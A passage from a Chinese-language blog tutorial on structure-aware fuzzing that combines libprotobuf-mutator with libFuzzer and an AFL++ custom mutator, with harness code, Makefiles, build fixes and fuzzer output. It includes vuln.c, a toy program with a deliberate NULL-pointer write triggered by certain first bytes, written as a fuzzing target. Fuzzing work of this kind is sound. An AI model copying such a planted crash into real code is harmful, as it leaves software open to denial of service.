<p>lpm_libfuzz.cc</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;test.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::cin;</span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">ProtoToData</span><span class="params">(<span class="type">const</span> TEST &amp;test_proto)</span> </span>&#123;</span><br><span class="line">    std::stringstream all;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> &amp;aa = test_proto.<span class="built_in">a</span>();</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> &amp;bb = test_proto.<span class="built_in">b</span>();</span><br><span class="line">    all.<span class="built_in">write</span>((<span class="type">const</span> <span class="type">char</span>*)&amp;aa, <span class="built_in">sizeof</span>(aa));</span><br><span class="line">    <span class="keyword">if</span>(bb.<span class="built_in">size</span>() != <span class="number">0</span>) &#123;</span><br><span class="line">        all.<span class="built_in">write</span>(bb.<span class="built_in">c_str</span>(), bb.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::string res = all.<span class="built_in">str</span>();</span><br><span class="line">    <span class="keyword">if</span> (bb.<span class="built_in">size</span>() != <span class="number">0</span> &amp;&amp; res.<span class="built_in">size</span>() != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// set PROTO_FUZZER_DUMP_PATH env to dump the serialized protobuf</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="type">const</span> <span class="type">char</span> *dump_path = <span class="built_in">getenv</span>(<span class="string">&quot;PROTO_FUZZER_DUMP_PATH&quot;</span>)) &#123;</span><br><span class="line">            <span class="function">std::ofstream <span class="title">of</span><span class="params">(dump_path)</span></span>;</span><br><span class="line">            of.<span class="built_in">write</span>(res.<span class="built_in">data</span>(), res.<span class="built_in">size</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">FuzzTEST</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span></span>; <span class="comment">// our customized fuzzing function</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">DEFINE_PROTO_FUZZER</span>(<span class="type">const</span> TEST &amp;test_proto) &#123;</span><br><span class="line">    <span class="keyword">auto</span> s = <span class="built_in">ProtoToData</span>(test_proto); <span class="comment">// convert protobuf to raw data</span></span><br><span class="line">    <span class="built_in">FuzzTEST</span>((<span class="type">const</span> <span class="type">uint8_t</span>*)s.<span class="built_in">data</span>(), s.<span class="built_in">size</span>()); <span class="comment">// fuzz the function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在文件的最开头导入 <code>libfuzzer_macro.h</code>， 后面就可以使用一些宏来写代码了，<code>DEFINE_PROTO_FUZZER</code> 是关键的 fuzzer 入口。结构化变异部分 libprotobuf-mutator 已经完成了，需要实现的是一个由 protobuf 转需要的数据类型的函数，如上面的 <code>ProtoToData</code></p>
<h4 id="代码编译"><a href="#代码编译" class="headerlink" title="代码编译"></a>代码编译</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">TARGET=lpm_libfuzz</span><br><span class="line">CXX=clang++</span><br><span class="line">CXXFLAGS=-g -fsanitize=fuzzer,address</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/</span><br><span class="line">LPM_DIR=<span class="variable">$(HOME)</span>/code/AFL+/external/libprotobuf-mutator</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line">LPM_LIB=<span class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator-libfuzzer.a <span class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator.a</span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span> -I<span class="variable">$(LPM_DIR)</span>/<span class="keyword">include</span></span><br><span class="line">DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST</span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for testing libprotobuf + libfuzzer</span></span><br><span class="line"><span class="comment"># compile harness first</span></span><br><span class="line"><span class="comment"># then link lpm_libfuzz with harness.o &amp; static libraries</span></span><br><span class="line"><span class="section">harness.o: harness.cc</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -c <span class="variable">$(DFUZZ)</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: harness.o <span class="variable">$(TARGET)</span>.cc</span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PB_SRC)</span> <span class="variable">$(LPM_LIB)</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span> <span class="comment"># $(LPM_LIB) must be placed before $(PROTOBUF_LIB)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">	rm <span class="variable">$(TARGET)</span> *.o</span><br></pre></td></tr></table></figure>

<p>make 后报错，找不到头文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/home/henices/code/AFL+/external/libprotobuf-mutator/include/libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h:24:10: fatal error: &#x27;port/protobuf.h&#x27; file not found</span><br><span class="line">#include &quot;port/protobuf.h&quot;</span><br><span class="line">         ^~~~~~~~~~~~~~~~~</span><br><span class="line">1 error generated.</span><br></pre></td></tr></table></figure>

<p>port&#x2F;protobuf.h  来自 <a target="_blank" rel="noopener" href="https://github.com/google/libprotobuf-mutator/blob/master/port/protobuf.h">https://github.com/google/libprotobuf-mutator/blob/master/port/protobuf.h</a>  修改 Makefile 如下</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">TARGET=lpm_libfuzz</span><br><span class="line">CXX=clang++</span><br><span class="line">CXXFLAGS=-g -fsanitize=fuzzer,address</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/</span><br><span class="line">LPM_DIR=<span class="variable">$(HOME)</span>/code/AFL+/external/libprotobuf-mutator</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line">LPM_LIB=<span class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator-libfuzzer.a <span class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator.a</span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span> -I<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/ -I<span class="variable">$(LPM_DIR)</span>/<span class="keyword">include</span></span><br><span class="line">DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST</span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for testing libprotobuf + libfuzzer</span></span><br><span class="line"><span class="comment"># compile harness first</span></span><br><span class="line"><span class="comment"># then link lpm_libfuzz with harness.o &amp; static libraries</span></span><br><span class="line"><span class="section">harness.o: harness.cc</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -c <span class="variable">$(DFUZZ)</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: harness.o <span class="variable">$(TARGET)</span>.cc</span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PB_SRC)</span> <span class="variable">$(LPM_LIB)</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span> <span class="comment"># $(LPM_LIB) must be placed before $(PROTOBUF_LIB)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">	rm <span class="variable">$(TARGET)</span> *.o</span><br></pre></td></tr></table></figure>

<p>修改 makefile 后，可以正常编译通过。经过我们上面的分析，不需要定义 <code>DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST</code> 将这行删除掉，同样可以编译通过。</p>
<p>执行 <code>lpm_libfuzz</code> 运行正常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  ./lpm_libfuzz                                                                                                                                                                                          </span><br><span class="line">INFO: found LLVMFuzzerCustomMutator (0x758a80). Disabling -len_control by default.</span><br><span class="line">INFO: Running with entropic power schedule (0xFF, 100).                                    </span><br><span class="line">INFO: Seed: 331712324                       </span><br><span class="line">INFO: Loaded 1 modules   (434 inline 8-bit counters): 434 [0xa056b8, 0xa0586a), </span><br><span class="line">INFO: Loaded 1 PC tables (434 PCs): 434 [0x939398,0x93aeb8), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#2      INITED cov: 82 ft: 83 corp: 1/1b exec/s: 0 rss: 35Mb</span><br><span class="line">        NEW_FUNC[1/41]: 0x75abb0 in TEST::~TEST() /tmp/genfiles/test.pb.cc:116</span><br><span class="line">        NEW_FUNC[2/41]: 0x75ca10 in google::protobuf::UnknownFieldSet* google::protobuf::internal::InternalMetadata::mutable_unknown_fields&lt;google::protobuf::UnknownFieldSet&gt;() /home/henices/code/libprotobuf-mut</span><br><span class="line">ator/build/external.protobuf//include/google/protobuf/metadata_lite.h:117</span><br><span class="line">#3      NEW    cov: 135 ft: 159 corp: 2/12b lim: 4096 exec/s: 0 rss: 36Mb L: 11/11 MS: 1 CustomCrossOver-</span><br><span class="line">#4      NEW    cov: 138 ft: 162 corp: 3/201b lim: 4096 exec/s: 0 rss: 36Mb L: 189/189 MS: 2 InsertRepeatedBytes-Custom-</span><br><span class="line">#38     REDUCE cov: 138 ft: 162 corp: 3/127b lim: 4096 exec/s: 0 rss: 37Mb L: 115/115 MS: 5 CustomCrossOver-CustomCrossOver-Custom-InsertRepeatedBytes-Custom-</span><br><span class="line">#60     REDUCE cov: 138 ft: 162 corp: 3/124b lim: 4096 exec/s: 0 rss: 37Mb L: 112/112 MS: 4 CustomCrossOver-ShuffleBytes-ChangeByte-Custom-</span><br><span class="line">#98     REDUCE cov: 138 ft: 162 corp: 3/56b lim: 4096 exec/s: 0 rss: 37Mb L: 44/44 MS: 5 CrossOver-Custom-Custom-CMP-Custom- DE: &quot;~\xff\xff\xff\xff\xff\xff\xff&quot;-</span><br><span class="line">#144    REDUCE cov: 138 ft: 162 corp: 3/53b lim: 4096 exec/s: 0 rss: 37Mb L: 41/41 MS: 2 CrossOver-Custom-</span><br><span class="line">#182    REDUCE cov: 138 ft: 162 corp: 3/25b lim: 4096 exec/s: 0 rss: 37Mb L: 13/13 MS: 5 ChangeBit-Custom-Custom-InsertByte-Custom-</span><br><span class="line">#324    REDUCE cov: 138 ft: 162 corp: 3/24b lim: 4096 exec/s: 0 rss: 38Mb L: 12/12 MS: 3 CustomCrossOver-EraseBytes-Custom-</span><br></pre></td></tr></table></figure>

<h3 id="Handling-input-from-AFL-in-our-custom-mutator"><a href="#Handling-input-from-AFL-in-our-custom-mutator" class="headerlink" title="Handling input from AFL++ in our custom mutator"></a>Handling input from AFL++ in our custom mutator</h3><p><a target="_blank" rel="noopener" href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/5_libprotobuf_aflpp_custom_mutator_input">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/5_libprotobuf_aflpp_custom_mutator_input</a></p>
<p>主要内容是将 libprotobuf-mutator 和 afl++ 结合起来，使用的 afl++ 的 custom mutator，值得一提的是在这个例子里，需要使用 <code>-fPIC</code> 参数编译 libprotobuf-mutator。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \</span><br><span class="line">-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator \</span><br><span class="line">-DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug \</span><br><span class="line">-DCMAKE_C_FLAGS=<span class="string">&quot;-fPIC&quot;</span> -DCMAKE_CXX_FLAGS=<span class="string">&quot;-fPIC&quot;</span></span><br></pre></td></tr></table></figure>

<p>主要的步骤在 <a target="_blank" rel="noopener" href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/blob/master/5_libprotobuf_aflpp_custom_mutator_input/README.md">readme.md</a> 中已经介绍得比较清楚了。</p>
<ul>
<li><code>lpm_aflpp_custom_mutator_input.cc</code> 是 afl++ 的 custom mutator shared library<ul>
<li>解析输入数据（testcase buffer）并将其转成 <code>TEST</code> protobuf message</li>
<li>使用 <code>libprotobuf-mutator</code> 变异 <code>TEST</code> protobuf message</li>
<li>注册一个 <code>PostProcessor</code> 处理变异后的 <code>TEST</code> protobuf message （非必要步骤）</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">size_t</span> <span class="title">afl_custom_fuzz</span><span class="params">(MyMutator *mutator, <span class="comment">// return value from afl_custom_init</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">uint8_t</span> *buf, <span class="type">size_t</span> buf_size, <span class="comment">// input data to be mutated</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">uint8_t</span> **out_buf, <span class="comment">// output buffer</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">uint8_t</span> *add_buf, <span class="type">size_t</span> add_buf_size,  <span class="comment">// add_buf can be NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">size_t</span> max_size)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// This function can be named either &quot;afl_custom_fuzz&quot; or &quot;afl_custom_mutator&quot;</span></span><br><span class="line">    <span class="comment">// A simple test shows that &quot;buf&quot; will be the content of the current test case</span></span><br><span class="line">    <span class="comment">// &quot;add_buf&quot; will be the next test case ( from AFL++&#x27;s input queue )</span></span><br><span class="line">    </span><br><span class="line">    TEST input;</span><br><span class="line">    <span class="comment">// parse input data to TEST</span></span><br><span class="line">    <span class="comment">// Notice that input data should be a serialized protobuf data</span></span><br><span class="line">    <span class="comment">// Check ./in/ii and test_protobuf_serializer for more detail</span></span><br><span class="line">    <span class="type">bool</span> parse_ok = input.<span class="built_in">ParseFromArray</span>(buf, buf_size);</span><br><span class="line">    <span class="keyword">if</span>(!parse_ok) &#123;</span><br><span class="line">        <span class="comment">// Invalid serialize protobuf data. Don&#x27;t mutate.</span></span><br><span class="line">        <span class="comment">// Return a dummy buffer. Also mutated_size = 0</span></span><br><span class="line">        <span class="type">static</span> <span class="type">uint8_t</span> *dummy = <span class="keyword">new</span> <span class="type">uint8_t</span>[<span class="number">10</span>]; <span class="comment">// dummy buffer with no data</span></span><br><span class="line">        *out_buf = dummy;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// mutate the protobuf</span></span><br><span class="line">    mutator-&gt;<span class="built_in">Mutate</span>(&amp;input, max_size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Convert protobuf to raw data</span></span><br><span class="line">    <span class="type">const</span> TEST *p = &amp;input;</span><br><span class="line">    std::string s = <span class="built_in">ProtoToData</span>(*p);</span><br><span class="line">    <span class="comment">// Copy to a new buffer ( mutated_out )</span></span><br><span class="line">    <span class="type">size_t</span> mutated_size = s.<span class="built_in">size</span>() &lt;= max_size ? s.<span class="built_in">size</span>() : max_size; <span class="comment">// check if raw data&#x27;s size is larger than max_size</span></span><br><span class="line">    <span class="type">uint8_t</span> *mutated_out = <span class="keyword">new</span> <span class="type">uint8_t</span>[mutated_size+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(mutated_out, s.<span class="built_in">c_str</span>(), mutated_size); <span class="comment">// copy the mutated data</span></span><br><span class="line">    <span class="comment">// Assign the mutated data and return mutated_size</span></span><br><span class="line">    *out_buf = mutated_out;</span><br><span class="line">    <span class="keyword">return</span> mutated_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>mutator-&gt;Mutate(&amp;input, max_size);</code> 为真正起作用的核心代码</p>
<ul>
<li><code>lpm_aflpp_custom_mutator_input.h</code>  继承了protobuf_mutator::Mutator， 可以使用 libprotobuf-mutator 的 Mutate 方法</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libprotobuf-mutator/src/mutator.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;test.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMutator</span> : <span class="keyword">public</span> protobuf_mutator::Mutator &#123;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>test_proto_serializer.cc</code></p>
<ul>
<li>用于生成一条序列化的 <code>TEST</code> protobuf message，可以作为 fuzz 的初始化 testcase 使用</li>
</ul>
</li>
<li><p><code>vuln.c</code> 漏洞测试程序</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>]=&#123;&#125;;</span><br><span class="line">    read(<span class="number">0</span>, str, <span class="number">100</span>);</span><br><span class="line">    <span class="type">int</span> *ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>( str[<span class="number">0</span>] == <span class="string">&#x27;\x02&#x27;</span> || str[<span class="number">0</span>] == <span class="string">&#x27;\xe8&#x27;</span>) &#123;</span><br><span class="line">        *ptr = <span class="number">123</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞测试程序比较简单，只要第一个字节是 <code>0xe8</code> 或者 <code>0x02</code> 即可，libprotobuf-mutator 的变异在这个例子里效率并不高，所以需要使用 <code>PostProcessor</code> 来优化变异。</p>
<ul>
<li>Makefile</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">TARGET=lpm_aflpp_custom_mutator_input</span><br><span class="line">CXX=clang++-11</span><br><span class="line">AFLCC=<span class="variable">$(HOME)</span>/AFLplusplus/afl-gcc</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/libprotobuf-mutator/build/external.protobuf</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line"></span><br><span class="line">LPM_DIR=<span class="variable">$(HOME)</span>/libprotobuf-mutator</span><br><span class="line">LPM_LIB=<span class="variable">$(LPM_DIR)</span>/build/src/libfuzzer/libprotobuf-mutator-libfuzzer.a <span class="variable">$(LPM_DIR)</span>/build/src/libprotobuf-mutator.a</span><br><span class="line"></span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span> -I<span class="variable">$(LPM_DIR)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span>.so</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>.so: <span class="variable">$(TARGET)</span>.cc <span class="variable">$(PB_SRC)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -fPIC -c <span class="variable">$^</span> <span class="variable">$(INC)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -shared -Wall -O3 -o <span class="variable">$@</span> *.o <span class="variable">$(LPM_LIB)</span> <span class="variable">$(PROTOBUF_LIB)</span></span><br><span class="line"></span><br><span class="line"><span class="section">vuln: vuln.c</span></span><br><span class="line">	<span class="variable">$(AFLCC)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">test_proto_serializer: test_proto_serializer.cc <span class="variable">$(PB_SRC)</span></span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">	rm *.so *.o vuln test_proto_serializer</span><br></pre></td></tr></table></figure>

<p>Makefile 有瑕疵，这个章节的内容和 libfuzzer 没有关系，不需要链接 <code>libprotobuf-mutator-libfuzzer.a</code></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://developers.google.com/protocol-buffers/docs/cpptutorial">https://developers.google.com/protocol-buffers/docs/cpptutorial</a><br><a target="_blank" rel="noopener" href="https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md">https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md</a><br><a target="_blank" rel="noopener" href="https://github.com/google/libprotobuf-mutator/">https://github.com/google/libprotobuf-mutator/</a><br><a target="_blank" rel="noopener" href="https://llvm.org/docs/LibFuzzer.html">https://llvm.org/docs/LibFuzzer.html</a><br><a target="_blank" rel="noopener" href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/05/05/How_do_you_actually_find_bugs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/05/How_do_you_actually_find_bugs/" class="post-title-link" itemprop="url">Keynote - How Do You Actually Find Bugs?</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-05-05 16:43:43" itemprop="dateCreated datePublished" datetime="2022-05-05T16:43:43+08:00">2022-05-05</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
